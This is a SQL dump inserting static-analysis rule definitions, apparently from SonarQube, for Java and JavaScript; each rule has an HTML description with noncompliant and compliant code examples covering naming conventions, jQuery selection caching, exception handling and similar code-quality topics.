INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1156, 'Selections should be stored', 'S2762', NULL, 'javascript', '<p>
  jQuery doesn''t cache elements for you. If you''ve made a selection that you might need to make again, you should save the selection in a variable rather than making the
  selection repeatedly.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
$( "p" ).hide();
$( "p" ).show();
</pre>

<h2>Compliant Solution</h2>
<pre>
var paragraph = $( "p" );

paragraph.hide();
paragraph.show();
</pre>

<h2>Exception</h2>
<p>
  Stored selections are not updated when the DOM changes. Since variables may need to updated this rule ignores selections that are repeated during an assignment.
</p>
<pre>
var paragraph = $("p");

// ...

paragraph = $("p");
</pre>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'LINEAR_OFFSET', NULL, '1min', NULL, '2min', 'number of times selection is re-made.', NULL, 'jquery,performance,user-experience', false, 'HTML', 1510817813277, 1510817813278, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1157, 'Multiline string literals should not be used', 'MultilineStringLiterals', NULL, 'javascript', '<p>Continuing a string across a linebreak is supported in most script engines, but it is not a part of ECMAScript. Additionally, the whitespace at the beginning of each line can''t be safely stripped at compile time, and any whitespace after the slash will result in tricky errors.</p>
<h2>Noncompliant Code Example</h2>

<pre>
var myString = ''A rather long string of English text, an error message \
                actually that just keeps going and going -- an error \
                message to make the Energizer bunny blush (right through \
                those Schwarzenegger shades)! Where was I? Oh yes, \
                you\''ve got an error and all the extraneous whitespace is \
                just gravy.  Have a nice day.'';  // Noncompliant
</pre>
<h2>Compliant Solution</h2>

<pre>
var myString = ''A rather long string of English text, an error message '' +
    ''actually that just keeps going and going -- an error '' +
    ''message to make the Energizer bunny blush (right through '' +
    ''those Schwarzenegger shades)! Where was I? Oh yes, '' +
    ''you\''ve got an error and all the extraneous whitespace is '' +
    ''just gravy.  Have a nice day.'';
</pre>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'bad-practice', false, 'HTML', 1510817813279, 1510817813280, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1103, '"Optional" should not be used for parameters', 'S3553', NULL, 'squid', '<p>The Java language authors have been quite frank that <code>Optional</code> was intended for use only as a return type, as a way to convey that a
method may or may not return a value. </p>
<p>And for that, it''s valuable but using <code>Optional</code> on the input side increases the work you have to do in the method without really
increasing the value. With an <code>Optional</code> parameter, you go from having 2 possible inputs: null and not-null, to three: null,
non-null-without-value, and non-null-with-value. Add to that the fact that overloading has long been available to convey that some parameters are
optional, and there''s really no reason to have <code>Optional</code> parameters.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public String sayHello(Optional&lt;String&gt; name) {  // Noncompliant
  if (name == null || !name.isPresent()) {
    return "Hello World";
  } else {
    return "Hello " + name;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public String sayHello(String name) {
  if (name == null) {
    return "Hello World";
  } else {
    return "Hello " + name;
  }
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'clumsy', false, 'HTML', 1510817813195, 1510817813196, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1104, 'Type parameter names should comply with a naming convention', 'S00119', 'S119', 'squid', '<p>Shared naming conventions make it possible for a team to collaborate efficiently. Following the established convention of single-letter type
parameter names helps users and maintainers of your code quickly see the difference between a type parameter and a poorly named class.</p>
<p>This rule check that all type parameter names match a provided regular expression. The following code snippets use the default regular
expression.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass&lt;TYPE&gt; { // Noncompliant
  &lt;TYPE&gt; void method(TYPE t) { // Noncompliant
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass&lt;T&gt; {
  &lt;T&gt; void method(T t) {
  }
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'convention', false, 'HTML', 1510817813197, 1510817813197, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1105, 'Deprecated code should be removed', 'S1133', NULL, 'squid', '<p>This rule is meant to be used as a way to track code which is marked as being deprecated. Deprecated code should eventually be removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Foo {
  /**
   * @deprecated
   */
  public void foo() {    // Noncompliant
  }

  @Deprecated            // Noncompliant
  public void bar() {
  }

  public void baz() {    // Compliant
  }
}
</pre>', 0, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'obsolete', false, 'HTML', 1510817813198, 1510817813198, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1139, '"undefined" should not be assigned', 'S2138', NULL, 'javascript', '<p>
  <code>undefined</code> is the value you get for variables and properties which have not yet been created. Use the same value to reset an existing variable and you lose the ability to distinguish between a variable that exists but has no value and a variable that does not yet exist. Instead, <code>null</code> should be used, allowing you to tell the difference between a property that has been reset and one that was never created.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
var myObject = {};

// ...
myObject.fname = undefined;  // Noncompliant
// ...

if (myObject.lname == undefined) {
  // property not yet created
}
if (myObject.fname == undefined) {
  // no real way of knowing the true state of myObject.fname
}
</pre>

<h2>Compliant Solution</h2>
<pre>
var myObject = {};

// ...
myObject.fname = null;
// ...

if (myObject.lname == undefined) {
  // property not yet created
}
if (myObject.fname == undefined) {
  // no real way of knowing the true state of myObject.fname
}
</pre>', 3, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'pitfall', false, 'HTML', 1510817813257, 1510817813257, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1140, 'Local variables should not shadow "undefined"', 'S2137', NULL, 'javascript', '<p>
  It is possible to name a variable <code>undefined</code> in a local scope, but it is a very bad idea because <code>undefined</code> is what''s returned for values and properties that have not yet been created. Make <code>undefined</code> a variable and you lose your ability to test whether other variables and properties exist.
 </p>

<h2>Noncompliant Code Example</h2>
<pre>
function foo () {
   var undefined = 1; // Noncompliant
   if (nonExistantVar == undefined) { // this logic doesn''t work now
     // ...
   }
 }
 </pre>

<h2>Compliant Solution</h2>
<pre>
function foo () {
   var bob = 1; // anything is better than naming it ''undefined''
   if (nonExistantVar == undefined) {
     // ...
   }
 }
 </pre>', 3, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'pitfall', false, 'HTML', 1510817813258, 1510817813258, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1106, '"Exception" should not be caught when not required by called methods', 'S2221', NULL, 'squid', '<p>Catching <code>Exception</code> seems like an efficient way to handle multiple possible exceptions. Unfortunately, it traps all exception types,
both checked and runtime exceptions, thereby casting too broad a net. Indeed, was it really the intention of developers to also catch runtime
exceptions? To prevent any misunderstanding, if both checked and runtime exceptions are really expected to be caught, they should be explicitly listed
in the <code>catch</code> clause.</p>
<p>This rule raises an issue if <code>Exception</code> is caught when it is not explicitly thrown by a method in the <code>try</code> block.</p>
<h2>Noncompliant Code Example</h2>
<pre>
try {
  // do something that might throw an UnsupportedDataTypeException or UnsupportedEncodingException
} catch (Exception e) { // Noncompliant
  // log exception ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
try {
  // do something
} catch (UnsupportedEncodingException|UnsupportedDataTypeException|RuntimeException e) {
  // log exception ...
}
</pre>
<p>or if runtime exceptions should not be caught:</p>
<pre>
try {
  // do something
} catch (UnsupportedEncodingException|UnsupportedDataTypeException e) {
  // log exception ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/396.html">MITRE, CWE-396</a> - Declaration of Catch for Generic Exception </li>
</ul>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'cwe,error-handling', false, 'HTML', 1510817813199, 1510817813200, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1107, 'Interface names should comply with a naming convention', 'S00114', 'S114', 'squid', '<p>Sharing some naming conventions is a key point to make it possible for a team to efficiently collaborate. This rule allows to check that all
interface names match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^[A-Z][a-zA-Z0-9]*$</code>:</p>
<pre>
public interface myInterface {...} // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
public interface MyInterface {...}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'convention', false, 'HTML', 1510817813200, 1510817813200, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1108, 'Track uses of "FIXME" tags', 'S1134', NULL, 'squid', '<p><code>FIXME</code> tags are commonly used to mark places where a bug is suspected, but which the developer wants to deal with later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int divide(int numerator, int denominator) {
  return numerator / denominator;              // FIXME denominator value might be  0
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/546.html">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'cwe', false, 'HTML', 1510817813202, 1510817813202, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1109, 'Files should contain an empty newline at the end', 'S00113', 'S113', 'squid', '<p>Some tools work better when files end with an empty line.</p>
<p>This rule simply generates an issue if it is missing.</p>
<p>For example, a Git diff looks like this if the empty line is missing at the end of the file:</p>
<pre>
+class Test {
+}
\ No newline at end of file
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1min', NULL, NULL, 'convention', false, 'HTML', 1510817813202, 1510817813202, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1110, 'Track uses of "TODO" tags', 'S1135', NULL, 'squid', '<p><code>TODO</code> tags are commonly used to mark places where some more code is required, but which the developer wants to implement later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void doSomething() {
  // TODO
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/546.html">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>', 0, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'cwe', false, 'HTML', 1510817813203, 1510817813203, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1111, 'Field names should comply with a naming convention', 'S00116', 'S116', 'squid', '<p>Sharing some naming conventions is a key point to make it possible for a team to efficiently collaborate. This rule allows to check that field
names match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^[a-z][a-zA-Z0-9]*$</code>:</p>
<pre>
class MyClass {
   private int my_field;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass {
   private int myField;
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'convention', false, 'HTML', 1510817813204, 1510817813204, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1112, 'Servlets should not have mutable instance fields', 'S2226', NULL, 'squid', '<p>By contract, a servlet container creates one instance of each servlet and then a dedicated thread is attached to each new incoming HTTP request to
process this request. So all threads are sharing the servlet instances and by extension instance fields. To prevent any misunderstanding and
unexpected behavior at runtime, all servlet fields should then be either <code>static</code> and/or <code>final</code>, or simply removed.</p>
<p>With Struts 1.X, the same constraint exists on <code>org.apache.struts.action.Action</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyServlet extends HttpServlet {
  private String userName;  //As this field is shared by all users, it''s obvious that this piece of information should be managed differently
  ...
}
</pre>
<p>or </p>
<pre>
public class MyAction extends Action {
  private String userName;  //Same reason
  ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/EYBUC">CERT, MSC11-J.</a> - Do not let session information leak within a servlet </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, 'cert,multi-threading,struts', false, 'HTML', 1510817813205, 1510817813205, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1113, 'Value-based classes should not be used for locking', 'S3436', NULL, 'squid', '<p>According to the documentation,</p>
<blockquote>
  A program may produce unpredictable results if it attempts to distinguish two references to equal values of a value-based class, whether directly
  via reference equality or indirectly via an appeal to synchronization...
</blockquote>
<p>This is because value-based classes are intended to be wrappers for value types, which will be primitive-like collections of data (similar to
<code>struct</code>s in other languages) that will come in future versions of Java.</p>
<blockquote>
  <p> Instances of a value-based class ... </p>
  <ul>
    <li> do not have accessible constructors, but are instead instantiated through factory methods which make no committment as to the identity of
    returned instances; </li>
  </ul>
</blockquote>
<p>Which means that you can''t be sure you''re the only one trying to lock on any given instance of a value-based class, opening your code up to
contention and deadlock issues.</p>
<p>Under Java 8 breaking this rule may not actually break your code, but there are no guarantees of the behavior beyond that.</p>
<p>This rule raises an issue when a known value-based class is used for synchronization. That includes all the classes in the <code>java.time</code>
package except <code>Clock</code>; the date classes for alternate calendars, <code>HijrahDate</code>, <code>JapaneseDate</code>,
<code>MinguoDate</code>, <code>ThaiBuddhistDate</code>; and the optional classes: <code>Optional</code>, <code>OptionalDouble</code>,
<code>OptionalLong</code>, <code>OptionalInt</code>.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project''s <code>sonar.java.source</code> is lower than <code>8</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Optional&lt;Foo&gt; fOpt = doSomething();
synchronized (fOpt) {  // Noncompliant
  // ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://docs.oracle.com/javase/8/docs/api/java/lang/doc-files/ValueBased.html">Value-based classes</a> </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'java8,lock-in,multi-threading', false, 'HTML', 1510817813206, 1510817813207, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1114, 'Boolean expressions should not be gratuitous', 'S2589', NULL, 'squid', '<p>If a boolean expression doesn''t change the evaluation of the condition, then it is entirely unnecessary, and can be removed. If it is gratuitous
because it does not match the programmer''s intent, then it''s a bug and the expression should be fixed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
a = true;
if (a) { // Noncompliant
  doSomething();
}

if (b &amp;&amp; a) { // Noncompliant; "a" is always "true"
  doSomething();
}

if (c || !a) { // Noncompliant; "!a" is always "false"
  doSomething();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
a = true;
if (foo(a)) {
  doSomething();
}

if (b) {
  doSomething();
}

if (c) {
  doSomething();
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 13.7 - Boolean operations whose results are invariant shall not be permitted. </li>
  <li> MISRA C:2012, 14.3 - Controlling expressions shall not be invariant </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/489">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/571">MITRE, CWE-571</a> - Expression is Always True </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/SIIyAQ">CERT, MSC12-CPP.</a> - Detect and remove code that has no effect </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'cert,cwe,misra,redundant', false, 'HTML', 1510817813207, 1510817813208, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1152, 'Values should not be uselessly incremented', 'S2123', NULL, 'javascript', 'A value that is incremented or decremented and then not stored is at best wasted code and at worst a bug.

<h2>Noncompliant Code Example</h2>
<pre>
var i = 0;
i = i++; // Noncompliant; i is still zero
</pre>

<h2>Compliant Solution</h2>
<pre>
var i = 0;
i++;
</pre>', 3, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817813272, 1510817813273, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1153, 'Results of operations on strings should not be ignored', 'S1154', NULL, 'javascript', '<p>Doing an operation on a string without using the result of the operation is useless and is certainly due to a misunderstanding. </p>
<h2>Noncompliant Code Example</h2>

<pre>
var str = "..."
str.toUpperCase(); // Noncompliant
</pre>
<h2>Compliant Solution</h2>

<pre>
var str = "..."
str = str.toUpperCase();
</pre>', 4, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, NULL, false, 'HTML', 1510817813273, 1510817813274, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1128, 'Variables should be declared with "let" or "const"', 'S3504', NULL, 'javascript', '<p>ECMAScript 2015 introduced the <code>let</code> and <code>const</code> keywords for block-scope variable declaration. Using <code>const</code> creates a read-only (constant) variable. </p>
<p>The distinction between the types of variable created by <code>var</code> and by <code>let</code> is significant, and a switch to <code>let</code> will help alleviate many of the variable scope issues which have caused confusion in the past. </p>
<p>Because these new keywords create more precise variable types, they are preferred in environments that support ECMAScript 2015. However, some refactoring may be required by the switch from <code>var</code> to <code>let</code>, and you should be aware that they raise <code>SyntaxError</code>s in pre-ECMAScript 2015 environments.</p>
<p>This rule raises an issue when <code>var</code> is used instead of <code>const</code> or <code>let</code>.</p>

<h2>Noncompliant Code Example</h2>
<pre>
var color = "blue";
var size = 4;
</pre>

<h2>Compliant Solution</h2>
<pre>
const color = "blue";
let size = 4;
</pre>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'bad-practice,es2015', false, 'HTML', 1510817813242, 1510817813243, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1129, '"[type=...]" should be used to select elements by type', 'S2898', NULL, 'javascript', '<p>
  While <code>:&lt;element_type&gt;</code> and <code>[type="&lt;element_type&gt;"]</code> can both be used in jQuery to select elements by their type,
  <code>[type="&lt;element_type&gt;"]</code> is far faster because it can take advantage of the native DOM <code>querySelectorAll()</code> method in modern browsers.
</p>

<p>This rule raises an issue when following selectors are used:</p>

<ul>
  <li><code>:checkbox</code></li>
  <li><code>:file</code></li>
  <li><code>:image</code></li>
  <li><code>:password</code></li>
  <li><code>:radio</code></li>
  <li><code>:reset</code></li>
  <li><code>:text</code></li>
</ul>
<h2>Noncompliant Code Example</h2>

<pre>
  var input = $( "form input:radio" ); // Noncompliant
</pre>

<h2>Compliant Solution</h2>

<pre>
  var input = $( "form input[type=radio]" ); // Compliant
</pre>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'jquery,performance', false, 'HTML', 1510817813244, 1510817813244, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1130, 'Control flow statements "if", "for", "while", "switch" and "try" should not be nested too deeply', 'NestedIfDepth', NULL, 'javascript', '<p>
  Nested <code>if</code>, <code>for</code>, <code>while</code>, <code>switch</code> and <code>try</code> statements is a key ingredient for making what''s known as "Spaghetti code".
  Such code is hard to read, refactor and therefore maintain.
</p>

<h2>Noncompliant Code Example</h2>
<p>
  The following code snippet illustrates this rule with the default threshold of 3.
</p>

<pre>
  if (condition1) {                  // Compliant - depth = 1
    /* ... */
    if (condition2) {                // Compliant - depth = 2
      /* ... */
      for(int i = 0; i < 10; i++) {  // Compliant - depth = 3, not exceeding the limit
        /* ... */
        if (condition4) {            // Non-Compliant - depth = 4
          if (condition5) {          // Depth = 5, exceeding the limit, but issues are only reported on depth = 4
            /* ... */
          }
          return;
        }
      }
    }
  }
</pre>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'brain-overload', false, 'HTML', 1510817813245, 1510817813246, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1154, 'Comments should not be located at the end of lines of code', 'TrailingComment', NULL, 'javascript', '<p>This rule verifies that single-line comments are not located at the end of a line of code.
The main idea behind this rule is that in order to be really readable,
trailing comments would have to be properly written and formatted (correct alignment,
no interference with the visual structure of the code, not too long to be visible) but most often,
automatic code formatters would not handle this correctly: the code would end up less readable.
Comments are far better placed on the previous empty line of code, where they will always be visible and properly formatted.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var a1 = b + c; // This is a trailing comment that can be very very long
</pre>

<h2>Compliant Solution</h2>
<pre>
// This very long comment is better placed before the line of code
var a2 = b + c;
</pre>

<h2>Exceptions</h2>

<p>By default, the property "legalTrailingCommentPattern" allows to ignore comments containing only one word :</p>
<pre>
doSomething(); //FIXME
</pre>', 0, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1min', NULL, NULL, 'convention', false, 'HTML', 1510817813274, 1510817813275, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1131, 'Variables and functions should not be redeclared', 'S2814', NULL, 'javascript', '<p>
  This rule checks that a declaration doesn''t use a name that is already in use. Indeed, it is possible to declare multiple variables and/or functions with the same name,
  but it''s hard to predict which declaration will be kept by the JavaScript interpreter.
</p>

<p>Typically, this kind of re-declaration is an error, and can lead to bugs and more generally to confusing code.</p>

<p>This rule also applies to function parameters.</p>

<h2>Noncompliant Code Example</h2>

<pre>
var a = ''foo'';
function a() {}   // Noncompliant
console.log(a);   // prints "foo"

function myFunc(arg) {
  var arg = "event"; // Noncompliant, argument value is lost
}

fun(); // prints "bar"

function fun() {
  console.log("foo");
}

fun(); // prints "bar"

function fun() {  // Noncompliant
  console.log("bar");
}

fun(); // prints "bar"
</pre>


<h2>Compliant Solution</h2>

<pre>
var a = ''foo'';
function otherName() {}
console.log(a);

function myFunc(arg) {
  var newName = "event";
}

fun(); // prints "foo"

function fun() {
  print("foo");
}

fun(); // prints "foo"

function printBar() {
  print("bar");
}

printBar(); // prints "bar"
</pre>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'pitfall', false, 'HTML', 1510817813248, 1510817813248, 2);
